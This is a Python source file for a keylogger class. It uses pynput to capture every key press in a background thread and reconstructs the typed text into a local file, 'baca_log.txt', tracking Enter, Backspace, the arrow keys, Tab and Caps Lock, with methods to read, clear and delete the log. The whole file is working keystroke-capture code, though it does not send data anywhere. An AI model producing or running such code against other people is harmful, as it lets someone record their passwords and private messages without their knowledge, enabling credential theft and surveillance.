from pynput.keyboard import Listener  # Library to capture keyboard input events
import threading                      # Used to run listener in a separate thread
import re                             # For string manipulation (regex)
import os                             # For file operations (delete, etc.)

class Keylogger:
    cursor = 0            # Tracks cursor position inside the log file (like a text editor)
    tombol = []           # Temporary storage for pressed keys
    hitung = 0            # Counter for number of keys processed
    path = 'baca_log.txt' # Log file path

    def start_listener(self):
        global listener
        # Initialize keyboard listener and bind key press event
        with Listener(on_press=self.key_pressed) as listener:
            listener.join()  # Keeps listener running

    def start_log(self):
        # Run listener in a separate thread to avoid blocking main program
        self.t = threading.Thread(target=self.start_listener)
        self.t.start()

    def key_pressed(self, key):
        # Store pressed key
        self.tombol.append(key)
        self.hitung += 1

        # Process keys when threshold is reached (currently every key)
        if self.hitung >= 1:
            self.hitung = 0

            # Open log file in append mode
            with open(self.path, 'a') as file:
                for i in self.tombol:

                    # Clean key string representation (remove quotes)
                    i = re.sub("'", "", str(i))

                    # Handle ENTER → insert newline at cursor
                    if i == "Key.enter":
                        data = open(self.path, 'r').read()
                        data = data[:self.cursor] + "\n" + data[self.cursor:]
                        self.cursor += 1
                        open(self.path, 'w').write(data)

                    # Ignore certain control keys
                    elif i in ("Key.shift",
                               "Key.shift_r",
                               "Key.ctrl",
                               "Key.escape"):
                        pass

                    # Handle BACKSPACE → remove character before cursor
                    elif i == "Key.backspace":
                        if self.cursor > 0:
                            data = open(self.path, "r").read()
                            data = data[:self.cursor-1] + data[self.cursor:]
                            self.cursor -= 1
                            open(self.path, 'w').write(data)

                    # Handle SPACE → insert space
                    elif i == "Key.space":
                        data = open(self.path, 'r').read()
                        data = data[:self.cursor] + " " + data[self.cursor:]
                        self.cursor += 1
                        open(self.path, 'w').write(data)

                    # Move cursor up (to previous line)
                    elif i == "Key.up":
                        data = open(self.path, "r").read()
                        pos = data.rfind("\n", 0, self.cursor)
                        if pos != -1:
                            self.cursor = pos

                    # Move cursor down (to next line)
                    elif i == "Key.down":
                        data = open(self.path, "r").read()
                        pos = data.find("\n", self.cursor)
                        if pos != -1:
                            self.cursor = pos + 1

                    # Move cursor right
                    elif i == "Key.right":
                        data = open(self.path, "r").read()
                        if self.cursor < len(data):
                            self.cursor += 1

                    # Move cursor left
                    elif i == "Key.left":
                        if self.cursor > 0:
                            self.cursor -= 1

                    # Handle TAB key
                    elif i == "Key.tab":
                        file.write(" [tab] ")

                    # Handle CAPS LOCK key
                    elif i == "Key.caps_lock":
                        file.write(" [cpslk] ")

                    # Default case → insert character at cursor position
                    else:
                        data = open(self.path, "r").read()
                        data = data[:self.cursor] + i + data[self.cursor:]
                        self.cursor += 1
                        open(self.path, "w").write(data)

        # Clear key buffer after processing
        self.tombol = []

    def baca_log(self):
        # Read and return contents of the log file
        with open('baca_log.txt', 'r') as file:
            data = file.read()
            return data

    def stop_listener(self):
        # Stop listener and delete log file
        listener.stop()
        os.remove(self.path)
    
    def clear_log(self):
        # Clear contents of the log file without deleting it
        with open('baca_log.txt', 'r+') as f:
            f.truncate(0)
